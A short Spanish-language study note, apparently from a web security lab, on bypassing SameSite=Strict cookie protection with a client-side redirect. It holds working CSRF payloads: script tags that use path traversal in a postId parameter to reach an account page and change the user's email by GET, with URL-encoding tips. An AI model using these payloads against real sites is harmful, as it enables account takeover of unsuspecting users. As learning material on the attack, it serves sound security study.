# Bypass de SameSite Strict con redirección cliente

Tags: #CSRF #BurpSuite #XSRF   

```bash 
Se puede cambiar el método a GET sin ningun problema y lo que se debe de hacer es que todo debe de suceder desde la misma página ya que la cookie se perdería


- SameSite Strict: Es una propiedad que se puede establecer en las cookies HTTP para evitar los ataques de falsificación de solicitud entre sitios (CSRF) en las aplicaciones web
```

```bash 
	/post/comment/confirmation?postId=2     # Lo que se coloque en 'postId' lo colocará en la redirección 
	/post/comment/confirmation?postId=../my-account   # Ir a la raiz de la web y despues a la cuenta del usuario para que eso se aplique en la redirección


	window.location = blogPath + '/' + postID;
	https://web.com/post/2
	https://web.com/post/../my-account     # Forma final cuando sucede la redirección
```

```javascript 
// Verificar si te mantiene con la misma Cookie de sesión 
<script>
	location="https://web.com/post/comment/confirmation?postId=../my-account";
</script>


// Cambiar el correo por GET
<script>
	location="https://web.com/post/comment/confirmation?postId=../my-account/change-email?email=a@test.com&submit=1";
</script>

	// Se debe de urlencodear despues de postID:
		? = %3f
		& = %26
```